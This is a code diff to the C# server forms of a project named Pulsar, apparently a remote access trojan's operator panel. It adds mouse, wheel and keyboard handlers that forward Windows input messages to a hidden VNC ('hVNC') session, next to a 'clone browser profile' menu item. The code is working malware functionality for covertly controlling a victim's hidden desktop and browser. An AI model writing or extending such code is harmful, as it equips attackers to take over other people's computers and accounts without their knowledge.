@@ -166,6 +166,15 @@ namespace Pulsar.Server.Forms
         /// </summary>
         private void SubscribeEvents()
         {
+            picDesktop.MouseDown += PicDesktop_MouseDown;
+            picDesktop.MouseUp += PicDesktop_MouseUp;
+            picDesktop.MouseMove += PicDesktop_MouseMove;
+            picDesktop.MouseWheel += PicDesktop_MouseWheel;
+            picDesktop.KeyDown += PicDesktop_KeyDown;
+            picDesktop.KeyUp += PicDesktop_KeyUp;
+            
+            picDesktop.TabStop = true;
+            picDesktop.Focus();
         }
 
         /// <summary>
@@ -173,6 +182,12 @@ namespace Pulsar.Server.Forms
         /// </summary>
         private void UnsubscribeEvents()
         {
+            picDesktop.MouseDown -= PicDesktop_MouseDown;
+            picDesktop.MouseUp -= PicDesktop_MouseUp;
+            picDesktop.MouseMove -= PicDesktop_MouseMove;
+            picDesktop.MouseWheel -= PicDesktop_MouseWheel;
+            picDesktop.KeyDown -= PicDesktop_KeyDown;
+            picDesktop.KeyUp -= PicDesktop_KeyUp;
         }
 
         /// <summary>
@@ -182,13 +197,17 @@ namespace Pulsar.Server.Forms
         {
             ToggleConfigurationControls(true);
 
-            picDesktop.addClient(_connectClient);
             picDesktop.Start();
             // Subscribe to the new frame counter.
             picDesktop.SetFrameUpdatedEvent(frameCounter_FrameUpdated);
 
             this.ActiveControl = picDesktop;
 
+            _hVNCHandler.EnableMouseInput = _enableMouseInput;
+            _hVNCHandler.EnableKeyboardInput = _enableKeyboardInput;
+            
+            _hVNCHandler.MaxFramesPerSecond = 30;
+            
             _hVNCHandler.BeginReceiveFrames(barQuality.Value, cbMonitors.SelectedIndex, useGPU);
         }
 
@@ -404,6 +423,7 @@ namespace Pulsar.Server.Forms
                 toolTipButtons.SetToolTip(btnMouse, "Enable mouse input.");
             }
 
+            _hVNCHandler.EnableMouseInput = _enableMouseInput;
             UpdateInputButtonsVisualState();
             this.ActiveControl = picDesktop;
         }
@@ -427,6 +447,7 @@ namespace Pulsar.Server.Forms
                 toolTipButtons.SetToolTip(btnKeyboard, "Enable keyboard input.");
             }
 
+            _hVNCHandler.EnableKeyboardInput = _enableKeyboardInput;
             UpdateInputButtonsVisualState();
             this.ActiveControl = picDesktop;
         }
@@ -568,6 +589,106 @@ namespace Pulsar.Server.Forms
             {
                 cLONEBROWSERPROFILEToolStripMenuItem.Text = "DIRECT START BROWSER";
             }
+        }
+
+        #endregion
+
+        #region Input Event Handlers
+
+        private void PicDesktop_MouseDown(object sender, MouseEventArgs e)
+        {
+            if (!_enableMouseInput) return;
+
+            uint message = 0;
+            int wParam = 0;
+
+            switch (e.Button)
+            {
+                case MouseButtons.Left:
+                    message = 0x0201; // WM_LBUTTONDOWN
+                    break;
+                case MouseButtons.Right:
+                    message = 0x0204; // WM_RBUTTONDOWN
+                    break;
+                case MouseButtons.Middle:
+                    message = 0x0207; // WM_MBUTTONDOWN
+                    break;
+                default:
+                    return;
+            }
+
+            int lParam = (e.Y << 16) | (e.X & 0xFFFF);
+            _hVNCHandler.SendMouseEvent(message, wParam, lParam);
+        }
+
+        private void PicDesktop_MouseUp(object sender, MouseEventArgs e)
+        {
+            if (!_enableMouseInput) return;
+
+            uint message = 0;
+            int wParam = 0;
+
+            switch (e.Button)
+            {
+                case MouseButtons.Left:
+                    message = 0x0202; // WM_LBUTTONUP
+                    break;
+                case MouseButtons.Right:
+                    message = 0x0205; // WM_RBUTTONUP
+                    break;
+                case MouseButtons.Middle:
+                    message = 0x0208; // WM_MBUTTONUP
+                    break;
+                default:
+                    return;
+            }
+
+            int lParam = (e.Y << 16) | (e.X & 0xFFFF);
+            _hVNCHandler.SendMouseEvent(message, wParam, lParam);
+        }
+
+        private void PicDesktop_MouseMove(object sender, MouseEventArgs e)
+        {
+            if (!_enableMouseInput) return;
+
+            uint message = 0x0200; // WM_MOUSEMOVE
+            int wParam = 0;
+            int lParam = (e.Y << 16) | (e.X & 0xFFFF);
+            
+            _hVNCHandler.SendMouseEvent(message, wParam, lParam);
+        }
+
+        private void PicDesktop_MouseWheel(object sender, MouseEventArgs e)
+        {
+            if (!_enableMouseInput) return;
+
+            uint message = 0x020A; // WM_MOUSEWHEEL
+            int wParam = (e.Delta << 16); // High-order word contains wheel delta
+            int lParam = (e.Y << 16) | (e.X & 0xFFFF);
+
+            _hVNCHandler.SendMouseEvent(message, wParam, lParam);
+        }
+
+        private void PicDesktop_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (!_enableKeyboardInput) return;
+
+            uint message = 0x0100; // WM_KEYDOWN
+            int wParam = (int)e.KeyCode;
+            int lParam = 1; // Key down
+
+            _hVNCHandler.SendKeyboardEvent(message, wParam, lParam);
+        }
+
+        private void PicDesktop_KeyUp(object sender, KeyEventArgs e)
+        {
+            if (!_enableKeyboardInput) return;
+
+            uint message = 0x0101; // WM_KEYUP
+            int wParam = (int)e.KeyCode;
+            int lParam = unchecked((int)0xC0000001); // Key up with repeat count
+
+            _hVNCHandler.SendKeyboardEvent(message, wParam, lParam);
         }
 
         #endregion
